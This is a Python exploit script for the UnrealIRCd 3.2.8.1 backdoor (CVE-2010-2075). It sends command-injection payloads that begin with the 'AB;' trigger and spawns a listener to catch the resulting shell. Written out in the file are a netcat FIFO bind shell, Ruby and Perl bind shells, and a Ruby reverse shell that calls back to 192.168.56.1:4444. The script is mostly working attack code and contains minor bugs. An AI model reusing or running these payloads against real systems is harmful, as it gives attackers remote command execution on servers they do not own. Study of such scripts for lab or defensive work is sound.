#!/usr/bin/env python3

import argparse
import socket
from thread import *


class UnrealExploit:
    def __init__(self):
        self.__sock = None
        self.__host = None
        self.__port = None
        self.__cmd = None
        self.netcat = b"AB; mkfifo /tmp/xnfkexe; (nc -l -p 4444 ||nc -l 4444)0</tmp/xnfkexe | /bin/sh >/tmp/xnfkexe 2>&1; rm /tmp/xnfkexe"
        self.bindruby = b"AB; ruby -rsocket -e 'exit if fork;s=TCPServer.new(\"40000\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
        self.bindperl = b"AB; perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'"
        self.revruby = b"AB;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"192.168.56.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))

    def __listen(self, port=4444):
        print("[+] Spawning listener...")
        self.__server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server.bind((socket.gethostname(), port))
        self.__server.listen(10)
        while True:
            print("Waiting for a connection...")
            (clientsocket, address) = self.__server.accept()
            print("Connection recieved, exploit succeeded")
            self.__server.close()

    def __restart(self):
        self.__sock.send()

    def __exploit(self):
        print(self.__sock.recv(1024))
        print(self.__sock.recv(1024))
        #self.__sock.send(bytes(self.__cmd, "utf-8"))
        #self.__sock.send(self.netcat)
#        self.__sock.send(self.bindruby)
        self.__sock.send(self.revruby)
        print("[+] Payload sent...")
        self.__sock.close()
        self.__listen()

    def run(self, host, port, cmd):
        self.__host = host
        self.__port = port
        self.__cmd = f"AB; {cmd}"
        self.__connect()
        return self.__exploit()


def main(args):

    print("[+] Unreal 3.2.81 Backdoor (CVE-2010-2075) by xentrick")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = UnrealExploit()
    if exploit.run(args.host, int(args.port), args.cmd):
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    parser.add_argument("cmd")
    args = parser.parse_args()

    main(args)
